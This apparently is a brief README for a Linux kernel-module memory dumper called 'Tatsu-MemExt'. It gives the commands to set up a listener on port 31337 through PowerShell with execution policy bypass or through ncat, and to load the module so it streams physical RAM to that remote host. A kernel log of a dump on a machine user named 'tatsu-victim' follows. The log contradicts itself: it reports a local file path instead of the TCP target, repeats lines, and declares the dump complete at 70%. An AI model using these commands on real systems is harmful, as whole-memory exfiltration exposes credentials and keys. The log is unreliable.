# Tatsu-MemExt

 powershell -ExecutionPolicy Bypass -File .\mem_receiver.ps1 -Port 31337 -OutputFile C:\memory.dmp
ncat -l -p 31337 > memory.dmp
insmod mem_dumper.ko dump_path=tcp:192.168.56.1:31337
dmesg -w


[ 3412.614510] MemDumper: Module loaded. Beginning dump process...
[ 3412.614519] MemDumper: Will write dump to file /home/tatsu-victim/mem.dmp
[ 3412.614522] MemDumper: Module loaded. Beginning dump process...
[ 3412.614609] kernel write not supported for file /6521/oom_score_adj (pid: 6521 comm: insmod)
[ 3412.614616] MemDumper: Failed to set OOM value: -22
[ 3412.614620] MemDumper: Process protection complete
[ 3412.614625] MemDumper: Total RAM: 3875 MB
[ 3412.614628] MemDumper: Will write dump to file /home/tatsu-victim/mem.dmp
[ 3412.614630] MemDumper: Starting memory dump to /home/tatsu-victim/mem.dmp
[ 3412.614631] MemDumper: totalram_pages = 992248
[ 3412.614633] MemDumper: totalhigh_pages = 0
[ 3412.614635] MemDumper: Max PFN: 992248
[ 3413.383796] MemDumper: PFN 100000/992248 (10%)
[ 3414.423943] MemDumper: PFN 200000/992248 (20%)
[ 3415.148915] MemDumper: PFN 300000/992248 (30%)
[ 3416.008472] MemDumper: PFN 400000/992248 (40%)
[ 3416.986784] MemDumper: PFN 500000/992248 (50%)
[ 3425.881182] MemDumper: PFN 600000/992248 (60%)
[ 3436.807030] MemDumper: PFN 700000/992248 (70%)
[ 3444.041782] MemDumper: Basic settings restored
[ 3444.041787] MemDumper: Dump complete. Errors: 0